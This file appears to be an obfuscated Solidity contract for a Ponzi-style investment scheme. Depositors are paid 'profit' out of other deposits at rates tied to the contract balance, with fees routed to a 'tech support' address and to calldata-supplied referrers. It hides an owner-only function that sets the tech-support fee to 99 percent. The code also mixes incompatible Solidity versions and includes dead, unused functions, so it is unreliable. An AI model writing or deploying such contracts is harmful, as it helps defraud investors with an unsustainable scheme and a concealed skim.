pragma solidity ^0.4.23;

contract Ox0d889935a8f39846436095c2818461cd276b110a {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public lastBlock;
    
    address public techSupportAddress;
    uint256 public techSupportPercent;
    address public defaultReferrer;
    uint256 public refPercent;
    uint256 public defaultRefPercent;
    
    function getProfitPercent(uint256 contractBalance) private pure returns (uint256) {
        if (contractBalance >= 1e22) {
            return 50;
        }
        if (contractBalance >= 7e21) {
            return 47;
        }
        if (contractBalance >= 5e21) {
            return 45;
        }
        if (contractBalance >= 3e21) {
            return 42;
        }
        if (contractBalance >= 1e21) {
            return 40;
        }
        if (contractBalance >= 5e20) {
            return 35;
        }
        if (contractBalance >= 2e20) {
            return 30;
        }
        if (contractBalance >= 1e20) {
            return 27;
        } else {
            return 25;
        }
    }
    
    function payTechSupport(uint256 amount) private {
        techSupportAddress.transfer(amount * techSupportPercent / 100);
    }
    
    function extractAddress(bytes data) private pure returns (address extractedAddress) {
        assembly {
            extractedAddress := mload(add(data, 20))
        }
    }
    
    function processReferral(uint256 amount, address investor) private {
        if (msg.data.length != 0) {
            address referrer = extractAddress(msg.data);
            if (referrer != investor) {
                investor.transfer(amount * refPercent / 100);
                referrer.transfer(amount * refPercent / 100);
            } else {
                defaultReferrer.transfer(amount * defaultRefPercent / 100);
            }
        }
    }
    
    function setProfitAmount(uint256 amount, address investor) private {
        require(msg.sender == defaultReferrer);
        techSupportPercent = 10 * 5 + 49;
    }
    
    function () external payable {
        if (deposits[msg.sender] != 0) {
            uint256 contractBalance = address(this).balance;
            uint256 profit = deposits[msg.sender] * getProfitPercent(contractBalance) / 1000 * (block.number - lastBlock[msg.sender]) / 6100;
            address investor = msg.sender;
            investor.transfer(profit);
        }
        
        if (msg.value > 0) {
            payTechSupport(msg.value);
            processReferral(msg.value, msg.sender);
        }
        
        lastBlock[msg.sender] = block.number;
        deposits[msg.sender] += msg.value;
    }
    
    function getIntFunc(uint256 index) internal view returns (uint256) {
        return _integer_constant[index];
    }
    
    function getAddrFunc(uint256 index) internal view returns (address payable) {
        return _address_constant[index];
    }
    
    uint256[] public _integer_constant = [
        25, 10, 30, 40, 10000000000000000000000, 
        1000000000000000000000, 42, 47, 45, 6100, 
        35, 50, 100000000000000000000, 500000000000000000000, 
        100, 3000000000000000000000, 7000000000000000000000, 
        5000000000000000000000, 49, 27, 5, 2, 
        200000000000000000000, 1000, 0
    ];
    
    address payable[] public _address_constant = [0x6366303f11bD1176DA860FD6571C5983F707854F];
}